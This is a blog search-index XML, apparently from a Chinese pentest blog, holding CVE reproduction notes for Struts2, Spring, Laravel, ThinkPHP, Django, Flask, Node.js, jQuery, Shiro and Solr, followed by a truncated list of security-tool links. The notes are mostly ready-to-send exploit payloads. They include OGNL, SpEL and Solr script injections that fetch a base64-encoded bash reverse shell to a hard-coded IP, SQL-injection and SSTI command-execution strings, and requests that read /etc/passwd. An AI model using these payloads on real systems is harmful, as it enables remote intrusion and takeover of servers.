<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>框架安全&amp;CVE复现&amp;Spring&amp;Struts&amp;Laravel&amp;ThinkPHP</title>
      <link href="/2022/04/23/kuang-jia-an-quan-cve-fu-xian-spring-struts-laravel-thinkphp/"/>
      <url>/2022/04/23/kuang-jia-an-quan-cve-fu-xian-spring-struts-laravel-thinkphp/</url>
      
        <content type="html"><![CDATA[<blockquote></blockquote><ul><li><p>框架安全&amp;CVE复现&amp;Spring&amp;Struts&amp;Laravel&amp;ThinkPHP</p><hr><p>1、开发框架-PHP-Laravel-Thinkphp</p><p>2、开发框架-Javaweb-St2-Spring</p><p>3、开发框架-Python-django-Flask</p><p>4、开发框架-Javascript-Node.js-JQuery</p><pre><code>常见语言开发框架：PHP：Thinkphp Laravel YII CodeIgniter CakePHP Zend等JAVA：Spring MyBatis Hibernate Struts2 Springboot等Python：Django Flask Bottle Turbobars Tornado Web2py等Javascript：Vue.js Node.js Bootstrap JQuery Angular 等</code></pre><p>一个网站的源码应用：</p><p>1.源码采用框架开发的</p><p>完全依赖于框架自身的安全机制</p><p>2.源码采用原生态开发的</p><p>整个文件上传文件功能都是自己写的， 自己控制 自己控制</p><h4 id="PHP-开发框架安全-Thinkphp-amp-Laravel"><a href="#PHP-开发框架安全-Thinkphp-amp-Laravel" class="headerlink" title="PHP-开发框架安全-Thinkphp&amp;Laravel"></a>PHP-开发框架安全-Thinkphp&amp;Laravel</h4><pre><code>Laravel是一套简洁、优雅的PHP Web开发框架(PHP Web Framework)。CVE-2021-3129 RCELaravel &lt;= 8.4.2https://github.com/zhzyker/CVE-2021-3129https://github.com/SecPros-Team/laravel-CVE-2021-3129-EXPThinkphp-3.X RCE-5.X RCEThinkPHP是一套开源的、基于PHP的轻量级Web应用开发框架武器库-Thinkphp专检</code></pre><h4 id="JAVAWEB-开发框架安全-Spring-amp-Struts2"><a href="#JAVAWEB-开发框架安全-Spring-amp-Struts2" class="headerlink" title="JAVAWEB-开发框架安全-Spring&amp;Struts2"></a>JAVAWEB-开发框架安全-Spring&amp;Struts2</h4><p>Struts2是一个基于MVC设计模式的Web应用框架</p><h5 id="1-cve-2020-17530"><a href="#1-cve-2020-17530" class="headerlink" title="1.cve_2020_17530"></a>1.cve_2020_17530</h5><pre><code>脚本：https://github.com/YanMu2020/s2-062手工：Content-Type: multipart/form-data; boundary=----1------1Content-Disposition: form-data; name="id"%{(#instancemanager=#application["org.apache.tomcat.InstanceManager"]).(#stack=#attr["com.opensymphony.xwork2.util.ValueStack.ValueStack"]).(#bean=#instancemanager.newInstance("org.apache.commons.collections.BeanMap")).(#bean.setBean(#stack)).(#context=#bean.get("context")).(#bean.setBean(#context)).(#macc=#bean.get("memberAccess")).(#bean.setBean(#macc)).(#emptyset=#instancemanager.newInstance("java.util.HashSet")).(#bean.put("excludedClasses",#emptyset)).(#bean.put("excludedPackageNames",#emptyset)).(#arglist=#instancemanager.newInstance("java.util.ArrayList")).(#arglist.add("id")).(#execute=#instancemanager.newInstance("freemarker.template.utility.Execute")).(#execute.exec(#arglist))}------1--bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC80Ny45NC4yMzYuMTE3LzU1NjYgMD4mMQ==}|{base64,-d}|{bash,-i}Content-Type: application/x-www-form-urlencodedid=%25%7b%28%23%69%6e%73%74%61%6e%63%65%6d%61%6e%61%67%65%72%3d%23%61%70%70%6c%69%63%61%74%69%6f%6e%5b%22%6f%72%67%2e%61%70%61%63%68%65%2e%74%6f%6d%63%61%74%2e%49%6e%73%74%61%6e%63%65%4d%61%6e%61%67%65%72%22%5d%29%2e%28%23%73%74%61%63%6b%3d%23%61%74%74%72%5b%22%63%6f%6d%2e%6f%70%65%6e%73%79%6d%70%68%6f%6e%79%2e%78%77%6f%72%6b%32%2e%75%74%69%6c%2e%56%61%6c%75%65%53%74%61%63%6b%2e%56%61%6c%75%65%53%74%61%63%6b%22%5d%29%2e%28%23%62%65%61%6e%3d%23%69%6e%73%74%61%6e%63%65%6d%61%6e%61%67%65%72%2e%6e%65%77%49%6e%73%74%61%6e%63%65%28%22%6f%72%67%2e%61%70%61%63%68%65%2e%63%6f%6d%6d%6f%6e%73%2e%63%6f%6c%6c%65%63%74%69%6f%6e%73%2e%42%65%61%6e%4d%61%70%22%29%29%2e%28%23%62%65%61%6e%2e%73%65%74%42%65%61%6e%28%23%73%74%61%63%6b%29%29%2e%28%23%63%6f%6e%74%65%78%74%3d%23%62%65%61%6e%2e%67%65%74%28%22%63%6f%6e%74%65%78%74%22%29%29%2e%28%23%62%65%61%6e%2e%73%65%74%42%65%61%6e%28%23%63%6f%6e%74%65%78%74%29%29%2e%28%23%6d%61%63%63%3d%23%62%65%61%6e%2e%67%65%74%28%22%6d%65%6d%62%65%72%41%63%63%65%73%73%22%29%29%2e%28%23%62%65%61%6e%2e%73%65%74%42%65%61%6e%28%23%6d%61%63%63%29%29%2e%28%23%65%6d%70%74%79%73%65%74%3d%23%69%6e%73%74%61%6e%63%65%6d%61%6e%61%67%65%72%2e%6e%65%77%49%6e%73%74%61%6e%63%65%28%22%6a%61%76%61%2e%75%74%69%6c%2e%48%61%73%68%53%65%74%22%29%29%2e%28%23%62%65%61%6e%2e%70%75%74%28%22%65%78%63%6c%75%64%65%64%43%6c%61%73%73%65%73%22%2c%23%65%6d%70%74%79%73%65%74%29%29%2e%28%23%62%65%61%6e%2e%70%75%74%28%22%65%78%63%6c%75%64%65%64%50%61%63%6b%61%67%65%4e%61%6d%65%73%22%2c%23%65%6d%70%74%79%73%65%74%29%29%2e%28%23%61%72%67%6c%69%73%74%3d%23%69%6e%73%74%61%6e%63%65%6d%61%6e%61%67%65%72%2e%6e%65%77%49%6e%73%74%61%6e%63%65%28%22%6a%61%76%61%2e%75%74%69%6c%2e%41%72%72%61%79%4c%69%73%74%22%29%29%2e%28%23%61%72%67%6c%69%73%74%2e%61%64%64%28%22%77%68%6f%61%6d%69%22%29%29%2e%28%23%65%78%65%63%75%74%65%3d%23%69%6e%73%74%61%6e%63%65%6d%61%6e%61%67%65%72%2e%6e%65%77%49%6e%73%74%61%6e%63%65%28%22%66%72%65%65%6d%61%72%6b%65%72%2e%74%65%6d%70%6c%61%74%65%2e%75%74%69%6c%69%74%79%2e%45%78%65%63%75%74%65%22%29%29%2e%28%23%65%78%65%63%75%74%65%2e%65%78%65%63%28%23%61%72%67%6c%69%73%74%29%29%7d</code></pre><h5 id="2-cve-2021-31805"><a href="#2-cve-2021-31805" class="headerlink" title="2.cve_2021_31805"></a>2.cve_2021_31805</h5><pre><code>https://github.com/YanMu2020/s2-062</code></pre><h5 id="Spring框架是由于软件开发的复杂性而创建的。"><a href="#Spring框架是由于软件开发的复杂性而创建的。" class="headerlink" title="Spring框架是由于软件开发的复杂性而创建的。"></a>Spring框架是由于软件开发的复杂性而创建的。</h5><p>1、cve_2017_4971-Spring Web Flow</p><pre><code>Spring WebFlow 2.4.0 - 2.4.4https://paper.seebug.org/322/_eventId_confirm=&amp;_csrf=e06e1d86-e083-45f7-b700-567b5f7f5d30&amp;_(new+java.lang.ProcessBuilder("bash","-c","bash+-i+&gt;%26+/dev/tcp/47.94.236.117/5566+0&gt;%261")).start()=vulhub</code></pre><p>2、cve_2018_1273-Spring Data Commons</p><pre><code>Spring Data Commons 1.13 - 1.13.10 (Ingalls SR10)Spring Data REST 2.6 - 2.6.10 (Ingalls SR10)Spring Data Commons 2.0 to 2.0.5 (Kay SR5)Spring Data REST 3.0 - 3.0.5 (Kay SR5)bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC80Ny45NC4yMzYuMTE3LzU1NjYgMD4mMQ==}|{base64,-d}|{bash,-i}username[#this.getClass().forName("java.lang.Runtime").getRuntime().exec("%62%61%73%68%20%2d%63%20%7b%65%63%68%6f%2c%59%6d%46%7a%61%43%41%74%61%53%41%2b%4a%69%41%76%5a%47%56%32%4c%33%52%6a%63%43%38%30%4e%79%34%35%4e%43%34%79%4d%7a%59%75%4d%54%45%33%4c%7a%55%31%4e%6a%59%67%4d%44%34%6d%4d%51%3d%3d%7d%7c%7b%62%61%73%65%36%34%2c%2d%64%7d%7c%7b%62%61%73%68%2c%2d%69%7d")]=&amp;password=&amp;repeatedPassword=</code></pre><p>3、CVE-2022-22963 Spring Cloud Function Spel表达式注入</p><pre><code>Spring Cloud Function 提供了一个通用的模型，用于在各种平台上部署基于函数的软件，包括像 Amazon AWS Lambda 这样的 FaaS（函数即服务，function as a service）平台。Connection: closespring.cloud.function.routing-expression: T(java.lang.Runtime).getRuntime().exec("bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC80Ny45NC4yMzYuMTE3LzU1NjYgMD4mMQ==}|{base64,-d}|{bash,-i}")</code></pre></li></ul>]]></content>
      
      
      <categories>
          
          <category> 框架安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Shmily </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>框架安全&amp;CVE复现&amp;Django&amp;Flask&amp;Node.JS&amp;JQuery</title>
      <link href="/2022/04/23/kuang-jia-an-quan-cve-fu-xian-django-flask-node.js-jquery/"/>
      <url>/2022/04/23/kuang-jia-an-quan-cve-fu-xian-django-flask-node.js-jquery/</url>
      
        <content type="html"><![CDATA[<blockquote></blockquote><ul><li><p>框架安全&amp;CVE复现&amp;Django&amp;Flask&amp;Node.JS&amp;JQuery</p><hr><h5 id="JavaScript-开发框架安全-Jquery-amp-Node"><a href="#JavaScript-开发框架安全-Jquery-amp-Node" class="headerlink" title="JavaScript-开发框架安全-Jquery&amp;Node"></a>JavaScript-开发框架安全-Jquery&amp;Node</h5><pre><code>jQuery 1、cve_2018_9207  cve_2018_9208 cve_2018_9209描述: jQuery是一个快速、简洁的JavaScript框架，是继Prototype之后又一个优秀的JavaScript代码库（框架）于2006年1月由John Resig发布。jQuery Upload File &lt;= 4.0.2 中的任意文件上传curl -F "myfile=@php.php" "http://123.58.236.76:56579/jquery-upload-file/php/upload.php"Node.js 1、cve_2021_21315Node.js是一个基于Chrome V8引擎的JavaScript运行环境，用于方便的搭建响应速度快、易于拓展的网络应用。Node.js-systeminformation是用于获取各种系统信息的Node.js模块,在存在命令注入漏洞的版本中，攻击者可以通过未过滤的参数中注入payload执行系统命令。Systeminformation &lt; &nbsp;5.3.1git clone https://github.com/ForbiddenProgrammer/CVE-2021-21315-PoC.gitnode index.js/api/getServices?name[]=$(echo -e 'xiaodi' &gt; test.txt)2、cve_2017_14849GET：/static/../../../a/../../../../etc/passwd</code></pre><h5 id="Python-开发框架安全-Django-amp-Flask"><a href="#Python-开发框架安全-Django-amp-Flask" class="headerlink" title="Python-开发框架安全-Django&amp;Flask"></a>Python-开发框架安全-Django&amp;Flask</h5><pre><code>Django Django是一款广为流行的开源web框架，由Python编写，许多网站和app都基于Django开发。Django采用了MTV的框架模式，即模型M，视图V和模版T，使用Django，程序员可以方便、快捷地创建高品质、易维护、数据库驱动的应用程序。而且Django还包含许多功能强大的第三方插件，使得Django具有较强的可扩展性。1、cve_2019_14234单引号已注入成功，SQL语句报错：/admin/vuln/collection/?detail__a%27b=123创建cmd_exec：/admin/vuln/collection/?detail__title%27)%3d%271%27%20or%201%3d1%20%3bcreate%20table%20cmd_exec(cmd_output%20text)--%20调用cmd_exec执行命令：/admin/vuln/collection/?detail__title%27)%3d%271%27%20or%201%3d1%20%3bcopy%20cmd_exec%20FROM%20PROGRAM%20%27ping hqrwsz.dnslog.cn%27--%202、CVE-2021-35042目录：/vuln/?order=vuln_collection.name);select%20updatexml(1,%20concat(0x7e,(select%20@@basedir)),1)%23版本：/vuln/?order=vuln_collection.name);select%20updatexml(1,%20concat(0x7e,(select%20version())),1)%23数据库名：/vuln/?order=vuln_collection.name);select%20updatexml(1,%20concat(0x7e,(select%20database())),1)%23Flask Jinja2 SSTIFlask是一个使用Python编写的轻量级Web应用框架。其WSGI工具箱采用Werkzeug ，模板引擎则使用Jinja2 .?name=%7B%25%20for%20c%20in%20%5B%5D.__class__.__base__.__subclasses__()%20%25%7D%0A%7B%25%20if%20c.__name__%20%3D%3D%20%27catch_warnings%27%20%25%7D%0A%20%20%7B%25%20for%20b%20in%20c.__init__.__globals__.values()%20%25%7D%0A%20%20%7B%25%20if%20b.__class__%20%3D%3D%20%7B%7D.__class__%20%25%7D%0A%20%20%20%20%7B%25%20if%20%27eval%27%20in%20b.keys()%20%25%7D%0A%20%20%20%20%20%20%7B%7B%20b%5B%27eval%27%5D(%27__import__(%22os%22).popen(%22id%22).read()%27)%20%7D%7D%0A%20%20%20%20%7B%25%20endif%20%25%7D%0A%20%20%7B%25%20endif%20%25%7D%0A%20%20%7B%25%20endfor%20%25%7D%0A%7B%25%20endif%20%25%7D%0A%7B%25%20endfor%20%25%7D</code></pre></li></ul>]]></content>
      
      
      <categories>
          
          <category> 框架安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Shmily </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>框架安全&amp;CVE复现&amp;Apache Shiro&amp;Apache Solr</title>
      <link href="/2022/04/23/kuang-jia-an-quan-cve-fu-xian-apache-shiro-apache-solr/"/>
      <url>/2022/04/23/kuang-jia-an-quan-cve-fu-xian-apache-shiro-apache-solr/</url>
      
        <content type="html"><![CDATA[<blockquote></blockquote><ul><li><p>框架安全&amp;CVE复现&amp;Apache Shiro&amp;Apache Solr</p><hr><h4 id="Apache-Shiro："><a href="#Apache-Shiro：" class="headerlink" title="Apache Shiro："></a>Apache Shiro：</h4><p>Apache Shiro是一个强大且易用的Java安全框架，用于身份验证、授权、密码和会话管理</p><p>判断：大多会发生在登录处，返回包里包含remeberMe=deleteMe字段</p><p>漏洞：<a href="https://avd.aliyun.com/search?q=shiro">https://avd.aliyun.com/search?q=shiro</a></p><p>Apache Shiro &lt;= 1.2.4 默认密钥致命令执行漏洞【CVE-2016-4483】</p><p>Apache Shiro &lt; 1.3.2 验证绕过漏洞【CVE-2016-2807】</p><p>Apache Shiro &lt; 1.4.2 cookie oracle padding漏洞 【CVE-2019-12442】</p><p>Apache Shiro &lt; 1.5.2 验证绕过漏洞 【CVE-2020-1957】</p><p>Apache Shiro &lt; 1.5.3 验证绕过漏洞 【CVE-2020-11989】</p><p>Apahce Shiro &lt; 1.6.0 验证绕过漏洞 【CVE-2020-13933】</p><p>Apahce Shiro &lt; 1.7.1 权限绕过漏洞 【CVE-2020-17523】</p><pre><code>1、CVE_2016_4437 Shiro-550+Shiro-7212、CVE-2020-11989Poc：/admin/%20影响范围：Apache Shiro &lt; 1.7.1https://github.com/jweny/shiro-cve-2020-175233、CVE-2020-1957Poc：/xxx/..;/admin/影响范围：Apache Shiro &lt; 1.5.3</code></pre><h4 id="Apache-Solr"><a href="#Apache-Solr" class="headerlink" title="Apache Solr:"></a>Apache Solr:</h4><p>Apache Solr是一个开源的搜索服务，使用Java语言开发，主要基于HTTP和Apache Lucene实现的。Solr是一个高性能，采用Java5开发，基于Lucene的全文搜索服务器。</p><p>漏洞：<a href="https://avd.aliyun.com/search?q=solr">https://avd.aliyun.com/search?q=solr</a></p><p>远程命令执行RCE（CVE-2017-12629）</p><p>远程命令执行XXE（CVE-2017-12629）</p><p>任意文件读取AND命令执行（CVE-2019-17558）</p><p>远程命令执行漏洞(CVE-2019-0192)</p><p>远程命令执行漏洞(CVE-2019-0193)</p><p>未授权上传漏洞(CVE-2020-13957)</p><p>Apache Solr SSRF (CVE-2021-27905)</p><h5 id="1、远程命令执行RCE（CVE-2017-12629）"><a href="#1、远程命令执行RCE（CVE-2017-12629）" class="headerlink" title="1、远程命令执行RCE（CVE-2017-12629）"></a>1、远程命令执行RCE（CVE-2017-12629）</h5><p>Apache solr&lt;7.1.0版本</p><h5 id="2、任意文件读取AND命令执行（CVE-2019-17558）"><a href="#2、任意文件读取AND命令执行（CVE-2019-17558）" class="headerlink" title="2、任意文件读取AND命令执行（CVE-2019-17558）"></a>2、任意文件读取AND命令执行（CVE-2019-17558）</h5><pre><code>Apache Solr 5.0.0版本至8.3.1https://github.com/jas502n/solr_rceD:\Python27\python.exe solr_rce.py http://123.58.236.76:50847 id</code></pre><h5 id="3、远程命令执行漏洞-CVE-2019-0193"><a href="#3、远程命令执行漏洞-CVE-2019-0193" class="headerlink" title="3、远程命令执行漏洞(CVE-2019-0193)"></a>3、远程命令执行漏洞(CVE-2019-0193)</h5><pre><code>Apache Solr &lt; 8.2.0版本&lt;dataConfig&gt;  &lt;dataSource type="URLDataSource"/&gt;  &lt;script&gt;&lt;![CDATA[          function poc(){ java.lang.Runtime.getRuntime().exec("bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC80Ny45NC4yMzYuMTE3LzU1NjYgMD4mMQ==}|{base64,-d}|{bash,-i}");          }  ]]&gt;&lt;/script&gt;  &lt;document&gt;    &lt;entity name="stackoverflow"            url="https://stackoverflow.com/feeds/tag/solr"            processor="XPathEntityProcessor"            forEach="/feed"            transformer="script:poc" /&gt;  &lt;/document&gt;&lt;/dataConfig&gt;4、Apache Solr 文件读取&amp;SSRF (CVE-2021-27905)全版本官方拒绝修复漏洞1、获取数据库名http://47.94.236.117:8983/solr/admin/cores?indexInfo=false&amp;wt=json2、访问触发curl -i -s -k -X $'POST' \    -H $'Content-Type: application/json' --data-binary $'{\"set-property\":{\"requestDispatcher.requestParsers.enableRemoteStreaming\":true}}' \    $'http://47.94.236.117:8983/solr/demo/config'3、任意文件读取curl -i -s -k 'http://47.94.236.117:8983/solr/demo/debug/dump?param=ContentStreams&amp;stream.url=file:///etc/passwd'</code></pre></li></ul>]]></content>
      
      
      <categories>
          
          <category> 框架安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Shmily </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>渗透常用工具地址-链接</title>
      <link href="/2022/04/19/chang-yong-gong-ju-lian-jie/"/>
      <url>/2022/04/19/chang-yong-gong-ju-lian-jie/</url>
      
        <content type="html"><![CDATA[<blockquote></blockquote><h3 id="常用工具地址-链接"><a href="#常用工具地址-链接" class="headerlink" title="常用工具地址-链接"></a><strong>常用工具地址-链接</strong></h3><h3 id="编码-x2F-加密"><a href="#编码-x2F-加密" class="headerlink" title="编码/加密"></a><strong>编码/加密</strong></h3><ul><li>CyberChef：编解码及加密，可本地部署 <a href="https://github.com/gchq/CyberChef">https://github.com/gchq/CyberChef</a></li><li>OK Tools在线工具：<a href="https://github.com/wangyiwy/oktools">https://github.com/wangyiwy/oktools</a></li><li>CTF在线工具：<a href="http://www.hiencode.com/">http://www.hiencode.com/</a></li><li>Unicode字符表：<a href="https://www.52unicode.com/enclosed-alphanumerics-zifu">https://www.52unicode.com/enclosed-alphanumerics-zifu</a></li><li>在线MD5 Hash破解：<a href="https://www.somd5.com/">https://www.somd5.com/</a></li></ul><h3 id="实用工具"><a href="#实用工具" class="headerlink" title="实用工具"></a><strong>实用工具</strong></h3><ul><li>Explain Shell：Shell命令解析 <a href="https://explainshell.com/">https://explainshell.com/</a></li><li>在线正则表达式：<a href="https://c.runoob.com/front-end/854/">https://c.runoob.com/front-end/854/</a></li><li>Ceye DNS：DNS oob平台 <a href="http://ceye.io/">http://ceye.io/</a></li><li>DNS log：DNS oob平台 <a href="http://dnslog.cn/">http://dnslog.cn/</a></li><li>Webshell Chop：<a href="https://webshellchop.chaitin.cn/demo/">https://webshellchop.chaitin.cn/demo/</a></li><li>XSS Chop：<a href="https://xsschop.chaitin.cn/demo/">https://xsschop.chaitin.cn/demo/</a></li><li>WebShell查杀：<a href="https://n.shellpub.com/">https://n.shellpub.com/</a></li><li>Google Hacking Database：<a href="https://www.exploit-db.com/google-hacking-database">https://www.exploit-db.com/google-hacking-database</a></li><li>Wayback Machine：网页缓存查询 <a href="https://archive.org/web">https://archive.org/web</a></li><li>在线代码格式标准化：<a href="http://web.chacuo.net/formatsh">http://web.chacuo.net/formatsh</a></li></ul><h3 id="IP-x2F-域名收集"><a href="#IP-x2F-域名收集" class="headerlink" title="IP/域名收集"></a><strong>IP/域名收集</strong></h3><h4 id="确认真实IP地址"><a href="#确认真实IP地址" class="headerlink" title="确认真实IP地址"></a><strong>确认真实IP地址</strong></h4><ul><li>IP精准定位：https://@<a href="http://www.ipuu.net/#/home">www.ipuu.net/#/home</a></li><li>IP 138：<a href="https://site.ip138.com/">https://site.ip138.com/</a></li><li>Security Trails：<a href="https://securitytrails.com/">https://securitytrails.com/</a></li></ul><h4 id="多个地点Ping服务器"><a href="#多个地点Ping服务器" class="headerlink" title="多个地点Ping服务器"></a><strong>多个地点Ping服务器</strong></h4><ul><li>Chinaz：<a href="https://ping.chinaz.com/">https://ping.chinaz.com/</a></li><li>Host Tracker：<a href="https://www.host-tracker.com/">https://www.host-tracker.com/</a></li><li>Webpage Test：<a href="https://www.webpagetest.org/">https://www.webpagetest.org/</a></li><li>DNS Check：<a href="https://dnscheck.pingdom.com/">https://dnscheck.pingdom.com/</a></li></ul><h4 id="Whois注册信息反查-mnip"><a href="#Whois注册信息反查-mnip" class="headerlink" title="Whois注册信息反查****mnip"></a><strong>Whois注册信息反查****mnip</strong></h4><ul><li>站长之家 Whois：<a href="https://whois.chinaz.com/">https://whois.chinaz.com/</a></li><li>中国万网 Whois：<a href="https://whois.aliyun.com/">https://whois.aliyun.com/</a></li><li>国际 Whois：<a href="https://who.is/">https://who.is/</a></li></ul><h4 id="DNS数据聚合查询"><a href="#DNS数据聚合查询" class="headerlink" title="DNS数据聚合查询"></a><strong>DNS数据聚合查询</strong></h4><ul><li>Hacker Target：<a href="https://hackertarget.com/find-dns-host-records">https://hackertarget.com/find-dns-host-records</a></li><li>DNS Dumpster：<a href="https://dnsdumpster.com/">https://dnsdumpster.com</a></li><li>DNS DB：<a href="https://dnsdb.io/zh-cn">https://dnsdb.io/zh-cn</a></li></ul><h4 id="TLS证书信息查询"><a href="#TLS证书信息查询" class="headerlink" title="TLS证书信息查询"></a><strong>TLS证书信息查询</strong></h4><ul><li>Censys：<a href="https://censys.io/">https://censys.io</a></li><li>Certificate Search：<a href="https://crt.sh/">https://crt.sh</a></li><li>证书透明度监控：<a href="https://developers.facebook.com/tools/ct&quot;">https://developers.facebook.com/tools/ct"</a></li></ul><h4 id="IP地址段收集"><a href="#IP地址段收集" class="headerlink" title="IP地址段收集"></a><strong>IP地址段收集</strong></h4><ul><li>CNNIC中国互联网信息中心：<a href="http://ipwhois.cnnic.net.cn/">http://ipwhois.cnnic.net.cn</a></li></ul><h3 id="网络空间搜索"><a href="#网络空间搜索" class="headerlink" title="网络空间搜索"></a><strong>网络空间搜索</strong></h3><ul><li>Fofa：<a href="https://fofa.info/">https://fofa.info/</a></li><li>Shodan：<a href="https://www.shodan.io/">https://www.shodan.io/</a></li><li>ZoomEye：<a href="https://www.zoomeye.org/">https://www.zoomeye.org/</a></li><li>谛听：<a href="https://www.ditecting.com/">https://www.ditecting.com/</a></li><li>360网络空间测绘：<a href="https://quake.360.cn/quake/#/index">https://quake.360.cn/quake/#/index</a></li><li>鹰图平台：<a href="https://user.skyeye.qianxin.com/">https://user.skyeye.qianxin.com</a></li></ul><h3 id="威胁情报平台"><a href="#威胁情报平台" class="headerlink" title="威胁情报平台"></a><strong>威胁情报平台</strong></h3><ul><li>Virustotal：<a href="https://www.virustotal.com/gui/home/upload">https://www.virustotal.com/gui/home/upload</a></li><li>腾讯哈勃分析系统：<a href="https://habo.qq.com/tool/index">https://habo.qq.com/tool/index</a></li><li>微步在线威胁情报：<a href="https://x.threatbook.cn/">https://x.threatbook.cn/</a></li><li>奇安信威胁情报：<a href="https://ti.qianxin.com/">https://ti.qianxin.com/</a></li><li>360威胁情报：<a href="https://ti.360.net/#/homepage">https://ti.360.net/#/homepage</a></li><li>安恒威胁情报：<a href="https://ti.dbappsecurity.com.cn/">https://ti.dbappsecurity.com.cn/</a></li><li>火线安全平台：<a href="https://www.huoxian.cn/">https://www.huoxian.cn</a></li><li>Hacking8安全信息流：<a href="https://i.hacking8.com/">https://i.hacking8.com/</a></li></ul><h3 id="CTF平台"><a href="#CTF平台" class="headerlink" title="CTF平台"></a><strong>CTF平台</strong></h3><ul><li><p>CTF Wiki：<a href="https://ctf-wiki.org/">https://ctf-wiki.org/</a></p></li><li><p>CTF show：<a href="https://ctf.show/">https://ctf.show/</a></p></li><li><p>CTF Time：<a href="https://ctftime.org/">https://ctftime.org/</a></p></li><li><p>CTF Tools：<a href="https://github.com/zardus/ctf-tools">https://github.com/zardus/ctf-tools</a></p></li><li><p>攻防世界：<a href="https://adworld.xctf.org.cn/">https://adworld.xctf.org.cn/</a></p></li><li><p>Hacker 101：<a href="https://www.hacker101.com/">https://www.hacker101.com/</a></p></li><li><p>NSSCTF: <a href="https://www.ctfer.vip/">https://www.ctfer.vip/</a></p></li><li><p>Bugku CTF: <a href="https://ctf.bugku.com/">https://ctf.bugku.com/</a></p></li><li><p>PwnTheBox: <a href="https://ce.pwnthebox.com/">https://ce.pwnthebox.com/</a></p></li><li><p>Jarvis OJ: <a href="https://www.jarvisoj.com/">https://www.jarvisoj.com</a></p></li><li><p>ctfhub: <a href="https://www.ctfhub.com/">https://www.ctfhub.com</a></p></li><li><p>buuctf: <a href="https://buuoj.cn/">https://buuoj.cn/</a></p></li></ul><h3 id="漏洞平台"><a href="#漏洞平台" class="headerlink" title="漏洞平台"></a><strong>漏洞平台</strong></h3><ul><li>Exploit Database：<a href="https://www.exploit-db.com/">https://www.exploit-db.com/</a></li><li>HackerOne：<a href="https://www.hackerone.com/">https://www.hackerone.com/</a></li><li>Vulhub：<a href="https://vulhub.org/">https://vulhub.org/</a></li><li>乌云镜像：<a href="http://wooyun.2xss.cc/">http://wooyun.2xss.cc/</a></li><li>知道创宇漏洞平台：<a href="https://www.seebug.org/">https://www.seebug.org/</a></li></ul><h3 id="靶机平台"><a href="#靶机平台" class="headerlink" title="靶机平台"></a><strong>靶机平台</strong></h3><ul><li>HackTheBox：<a href="https://www.hackthebox.com/">https://www.hackthebox.com/</a></li><li>OWASP Top10：<a href="https://owasp.org/www-project-juice-shop/">https://owasp.org/www-project-juice-shop/</a></li><li>WebGoat：<a href="https://github.com/WebGoat/WebGoat">https://github.com/WebGoat/WebGoat</a></li></ul><h3 id="公开知识库"><a href="#公开知识库" class="headerlink" title="公开知识库"></a><strong>公开知识库</strong></h3><ul><li>狼组公开知识库：<a href="https://wiki.wgpsec.org/">https://wiki.wgpsec.org/</a></li><li>404星链计划：知道创宇 404 实验室 <a href="https://github.com/knownsec/404StarLink">https://github.com/knownsec/404StarLink</a></li></ul><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a><strong>信息收集</strong></h2><h3 id="指纹识别"><a href="#指纹识别" class="headerlink" title="指纹识别"></a><strong>指纹识别</strong></h3><ul><li>Wapplyzer：Chrome插件 跨平台网站分析工具 <a href="https://github.com/AliasIO/Wappalyzer">https://github.com/AliasIO/Wappalyzer</a></li><li>TideFinger：提取了多个开源指纹识别工具的规则库并进行了规则重组 <a href="https://github.com/TideSec/TideFinger">https://github.com/TideSec/TideFinger</a></li><li>御剑web指纹识别程序：<a href="https://www.webshell.cc/4697.html">https://www.webshell.cc/4697.html</a></li><li>云悉指纹识别：<a href="http://www.yunsee.cn/">http://www.yunsee.cn/</a></li></ul><h3 id="扫描-x2F-爆破"><a href="#扫描-x2F-爆破" class="headerlink" title="扫描/爆破"></a><strong>扫描/爆破</strong></h3><ul><li>dirsearch：目录扫描/爆破 <a href="https://github.com/maurosoria/dirsearch">https://github.com/maurosoria/dirsearch</a></li><li>dirmap：目录扫描/爆破 <a href="https://github.com/H4ckForJob/dirmap">https://github.com/H4ckForJob/dirmap</a></li><li>Arjun：HTTP参数扫描器 <a href="https://github.com/s0md3v/Arjun">https://github.com/s0md3v/Arjun</a></li><li>ksubdomain：子域名爆破 <a href="https://github.com/knownsec/ksubdomain">https://github.com/knownsec/ksubdomain</a></li><li>Gobuster：URI/DNS/WEB爆破 <a href="https://github.com/OJ/gobuster">https://github.com/OJ/gobuster</a></li></ul><h3 id="爆破字典"><a href="#爆破字典" class="headerlink" title="爆破字典"></a><strong>爆破字典</strong></h3><ul><li>Dictionary-Of-Pentesting：渗透测试、SRC漏洞挖掘、爆破、Fuzzing等常用字典 <a href="https://github.com/insightglacier/Dictionary-Of-Pentesting">https://github.com/insightglacier/Dictionary-Of-Pentesting</a></li><li>fuzzDicts：Web渗透Fuzz字典 <a href="https://github.com/TheKingOfDuck/fuzzDicts">https://github.com/TheKingOfDuck/fuzzDicts</a></li><li>PentesterSpecialDict：渗透测试工程师精简化字典 <a href="https://github.com/ppbibo/PentesterSpecialDict">https://github.com/ppbibo/PentesterSpecialDict</a></li></ul><h3 id="综合信息收集"><a href="#综合信息收集" class="headerlink" title="综合信息收集"></a><strong>综合信息收集</strong></h3><ul><li>AlliN：<a href="https://github.com/P1-Team/AlliN">https://github.com/P1-Team/AlliN</a></li><li>Kunyu：<a href="https://github.com/knownsec/Kunyu">https://github.com/knownsec/Kunyu</a></li><li>OneForAll：<a href="https://github.com/shmilylty/OneForAll">https://github.com/shmilylty/OneForAll</a></li><li>ShuiZe：<a href="https://github.com/0x727/ShuiZe_0x727">https://github.com/0x727/ShuiZe_0x727</a></li><li>Fofa Viewer：<a href="https://github.com/wgpsec/fofa_viewer">https://github.com/wgpsec/fofa_viewer</a></li></ul><h3 id="内网信息收集"><a href="#内网信息收集" class="headerlink" title="内网信息收集"></a><strong>内网信息收集</strong></h3><ul><li>fscan：内网综合扫描工具 <a href="https://github.com/shadow1ng/fscan">https://github.com/shadow1ng/fscan</a></li><li>EHole：红队重点攻击系统指纹探测工具 <a 